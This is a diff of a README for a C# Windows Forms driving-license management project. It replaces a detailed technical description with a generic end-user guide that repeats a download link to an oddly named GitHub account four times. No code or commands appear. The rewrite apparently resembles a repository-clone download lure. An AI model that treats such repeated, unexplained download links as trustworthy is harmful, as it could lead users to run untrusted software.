@@ -1,183 +1,219 @@
-# DVLD Management System
+# 🚗 MyDVLD - Manage Driving Licenses With Ease
 
-DVLD Management System is a Windows Forms desktop application for managing driving license services through a structured, rule-based workflow.
+[![Download MyDVLD](https://img.shields.io/badge/Download-MyDVLD-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD)
 
-The project applies desktop application development concepts using C#, SQL Server, and ADO.NET within a 3-layer architecture. It covers the full process of handling people, applications, tests, licenses, and related services in a database-driven system.
+## 📥 Download MyDVLD
 
-## Overview
+Visit this page to download:  
+https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD
 
-This system simulates the core operations of a driving license department. It manages applicant records, license applications, test appointments, license issuance, renewal, detention, release, and international licenses through a business workflow with validations and process rules.
+## 🖥️ What MyDVLD Does
 
-## Tech Stack
+MyDVLD is a Windows desktop app for driving license work. It helps with common tasks such as:
 
-- C#
-- Windows Forms
-- SQL Server
-- ADO.NET
-- SQL Queries
+- Adding people and applicant records
+- Managing driving license applications
+- Tracking test and renewal steps
+- Viewing license details in one place
+- Keeping records in SQL Server
 
-## Architecture
+It uses C#, Windows Forms, SQL Server, and ADO.NET. The app follows a 3-layer design, which helps keep the data, logic, and screens separate.
 
-The project follows a 3-layer architecture:
+## ✅ Who This App Is For
 
-- Presentation Layer
-- Business Layer
-- Data Access Layer
+MyDVLD suits users who need a simple way to manage driving license workflows on a Windows PC. It can help at:
 
-This structure helps separate the user interface, business logic, and database operations for better organization and maintainability.
+- Driving license offices
+- Training centers
+- Front desk work areas
+- Small internal admin teams
 
-## Features
+You do not need coding skills to use the app after it is set up.
 
-### Core Modules
-- Login system
-- People management
-- Users management
-- Drivers management
-- Local driving license applications
-- Test appointments
-- Application types management
-- Test types management
-- Detained licenses management
+## 💻 System Requirements
 
-### License Services
-- First-time license issuance
-- License renewal
-- Replacement for lost licenses
-- Replacement for damaged licenses
-- License detention
-- Release detained licenses
-- International license issuance
+Use a Windows PC with:
 
-## Business Workflow
+- Windows 10 or Windows 11
+- .NET Desktop Runtime or the version required by the app build
+- SQL Server installed and running
+- Enough disk space for the app and database files
+- A mouse and keyboard for normal use
 
-The system follows a structured workflow:
+For best results, use a machine with at least:
 
-1. A person is registered in the system.
-2. The person submits a driving license application.
-3. The applicant completes the required tests in order.
-4. After passing all required steps, the license can be issued.
-5. Additional services such as renewal, replacement, detention, release, and international licensing can then be managed.
+- 4 GB RAM
+- 2 GB free storage
+- A stable local Windows account with install rights
 
-## Test Process
+## 🧭 What You Need Before You Start
 
-The system includes three required tests:
+Before you open the app, make sure you have:
 
-- Vision Test
-- Written Test
-- Practical Driving Test
+- The MyDVLD project files from the link above
+- SQL Server installed on your computer
+- SQL Server Management Studio if you want to manage the database by hand
+- Access to the database scripts or backup used by the app
+- Permission to install and run desktop software on your PC
 
-## Business Rules
+## 📦 Download and Open the Project
 
-The project applies several business validations and restrictions, including:
+1. Go to the download page:  
+   https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD
 
-- Tests must be completed in sequence
-- A test cannot be scheduled before passing the previous one
-- Failed tests require a retake application with additional fees
-- Passed tests cannot be repeated unnecessarily
-- Minimum age depends on the selected license class
-- Some actions depend on the current application status
-- Some services depend on the current license status
-- International licenses can only be issued under specific conditions
+2. Download the project files to your computer.
 
-## Search and Filtering
+3. Save the files in a folder you can find again, such as:
+   - Downloads
+   - Desktop
+   - Documents
 
-The application supports search and filtering in listing screens using `DataGridView`.
+4. If the files come in a ZIP folder, right-click the ZIP file and choose Extract All.
 
-Examples include searching by:
-- ID
-- National Number
-- Name
+5. Open the extracted folder and look for the project or app files.
 
-Some inputs are also validated depending on the selected search type.
+## 🛠️ Install SQL Server
 
-## Authentication and Security
+MyDVLD uses SQL Server to store all records. If SQL Server is not on your PC yet, install it first.
 
-The project includes a login system for system users.
+1. Install SQL Server on your Windows computer.
+2. Start the SQL Server service.
+3. Make sure you can connect to the server from your machine.
+4. Install SQL Server Management Studio if you want an easy way to view the database.
 
-Password handling was improved from plain text storage to a more secure approach using:
-- PasswordHash
-- PasswordSalt
+If your team gave you a database backup or script, restore it or run it before opening the app.
 
-with a randomly generated salt value.
+## 🗄️ Set Up the Database
 
-## Reusable UI Components
+To let MyDVLD work correctly, you need a ready database.
 
-The project includes reusable UI elements such as:
-- UserControls reused across multiple screens
-- Context menus for quick access to related actions
-- Shared interface components for presenting license-related information
+1. Open SQL Server Management Studio.
+2. Connect to your local SQL Server instance.
+3. Restore the database backup, or run the SQL script provided with the project.
+4. Check that the database shows up in the list of databases.
+5. Make sure the tables and sample data are present if included.
 
-## Data Source
+If the app uses a connection string in a config file, update it so it points to your SQL Server name and database name.
 
-All core data is stored in SQL Server.
+## ▶️ Run the Application
 
-The application relies on database-driven operations through ADO.NET and SQL queries.
+After the files and database are ready, open the app.
 
-## Screenshots
+1. Open the project in Visual Studio if you are using the source files.
+2. Build the solution.
+3. Start the application.
+4. Log in or open the main window, if the app uses one.
+5. Check that the screens load and that the app can read data from SQL Server.
 
-Here are some screenshots showing the main screens and workflows of the application.
+If you received a compiled app, open the `.exe` file from the app folder and run it on Windows.
 
-<table>
-  <tr>
-    <td align="center">
-      <img src="screenshots/login-screen.png" alt="Login Screen" width="100%" />
-      <br />
-      <sub><b>Login Screen</b></sub>
-    </td>
-    <td align="center">
-      <img src="screenshots/main-menu.png" alt="Main Menu" width="100%" />
-      <br />
-      <sub><b>Main Menu</b></sub>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="screenshots/people-list.png" alt="People List" width="100%" />
-      <br />
-      <sub><b>People List</b></sub>
-    </td>
-    <td align="center">
-      <img src="screenshots/local-license-application.png" alt="Local License Application" width="100%" />
-      <br />
-      <sub><b>Local License Application</b></sub>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <img src="screenshots/application-types.png" alt="Application Types" width="100%" />
-      <br />
-      <sub><b>Application Types</b></sub>
-    </td>
-    <td align="center">
-      <img src="screenshots/detained-licenses.png" alt="Detained Licenses" width="100%" />
-      <br />
-      <sub><b>Detained Licenses</b></sub>
-    </td>
-  </tr>
-</table>
+## 🔧 First-Time Setup Checklist
 
-## Current Limitations
+Use this checklist the first time you open MyDVLD:
 
-- No role-based authorization system
-- No dashboard or advanced reporting module
-- No printing support
-- Some UI parts can still be improved and refined
+- Confirm SQL Server is running
+- Confirm the database exists
+- Check the connection string
+- Make sure the app opens without errors
+- Test a sample record, such as a person or application entry
+- Confirm saved data appears in SQL Server
 
-## Future Improvements
+## 🧩 Main Features
 
-Possible future enhancements include:
+MyDVLD includes tools for license workflow management such as:
 
-- Add role-based permissions
-- Add reports and statistics
-- Add printing support
-- Improve UI design and usability
-- Refactor some modules for better maintainability
+- Person record management
+- Application tracking
+- License status tracking
+- Renewal and test flow handling
+- Data storage in SQL Server
+- Clean screen layout with Windows Forms
+- Separated app layers for better code structure
 
-## Project Purpose
+## 🪟 Using the App on Windows
 
-This project was built as a practical training project to apply real-world concepts in:
+When the app opens, use it like a normal desktop program:
 
-- Desktop application development
-- Layered architecture
-- Business workflow implementation
-- Database-driven systems using ADO.NET and SQL Server
+1. Select the area you want to work in.
+2. Enter the needed record details.
+3. Save the data.
+4. Search for records when needed.
+5. Open a record to view or update it.
+
+Use the mouse for buttons and forms. Use the keyboard for fields and search boxes.
+
+## 🧾 Common Tasks
+
+### Add a person
+1. Open the person form.
+2. Enter the person details.
+3. Save the record.
+
+### Create a license application
+1. Open the application screen.
+2. Choose the person.
+3. Fill in the application data.
+4. Save it.
+
+### Review a license record
+1. Search for the person or license.
+2. Open the matching record.
+3. Check status, dates, and related details.
+
+### Update a record
+1. Open the saved entry.
+2. Change the needed field.
+3. Save the update.
+
+## 🔍 Troubleshooting
+
+If the app does not open, check these items:
+
+- The app files are not blocked by Windows
+- SQL Server is running
+- The database exists
+- The connection string is correct
+- You opened the right project or `.exe` file
+- Visual Studio has the needed desktop workload if you are building from source
+
+If records do not save, check the database connection and confirm the table names match the app setup.
+
+## 📁 Project Structure
+
+The app uses a 3-layer layout:
+
+- Presentation layer: the Windows Forms screens
+- Business layer: the rules and actions
+- Data layer: the SQL Server access code
+
+This setup helps keep the app organized and easier to maintain.
+
+## 🔐 Data Handling
+
+MyDVLD stores records in SQL Server, so your data stays in a local database unless you move it elsewhere. Keep backups of the database if you plan to use the app for real work.
+
+## 🧰 For Users Opening the App From Source
+
+If you downloaded the source files and want to run the app in Visual Studio:
+
+1. Install Visual Studio with Windows Forms support.
+2. Open the solution file.
+3. Restore any needed NuGet packages.
+4. Update the database connection string.
+5. Build the solution.
+6. Start the app.
+
+## 📌 Helpful Checks Before Daily Use
+
+Before you begin normal work each day:
+
+- Start SQL Server
+- Open the app
+- Check that the main screen loads
+- Try a test search
+- Confirm saved records still appear in the database
+
+## 📞 Access
+
+Use the download page here:  
+https://github.com/Trillion-pinkandwhiteeverlasting354/MyDVLD
